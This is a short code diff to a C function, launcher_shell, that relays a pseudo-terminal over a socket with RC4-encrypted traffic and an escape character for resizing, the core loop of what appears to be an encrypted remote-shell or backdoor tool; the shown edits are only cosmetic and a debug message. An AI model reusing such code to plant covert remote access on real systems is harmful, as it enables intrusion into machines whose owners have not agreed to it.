@@ -369,21 +369,21 @@ void launcher_shell(int sockr, int sockw) {
             //if (select(max(pty, sockr)  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;
             nfd = select(max(pty, sockr)  + 1, &fds, NULL, NULL, &tv);
             if (nfd < 0 && (errno != EINTR)) break;
-            else if (nfd == 0) { break; }
+            else if (nfd == 0) break; 
             else {
                 /* shell => client */
                 if (FD_ISSET(pty, &fds)) {
                     count = read(pty, buf, BUFSIZE);
                     if ((count <= 0) && (errno != EINTR)) break;
                     rc4(buf, count, &rc4_crypt);
-                    if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;    
+                    if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;
                 /* client => shell */
                 } else if (FD_ISSET(sockr, &fds)) {
                     count = read(sockr, buf, BUFSIZE);
                     if ((count <= 0) && (errno != EINTR)) break;
                     rc4(buf, count, &rc4_decrypt);
                     if ((p = memchr(buf, ECHAR, count))){
-                        debug("Received special char\n");
+                        debug("Received special char: %d\n", count);
 			    		if (count == 1) break;
 			    		else if (count == 5) {
                         	struct  winsize ws;
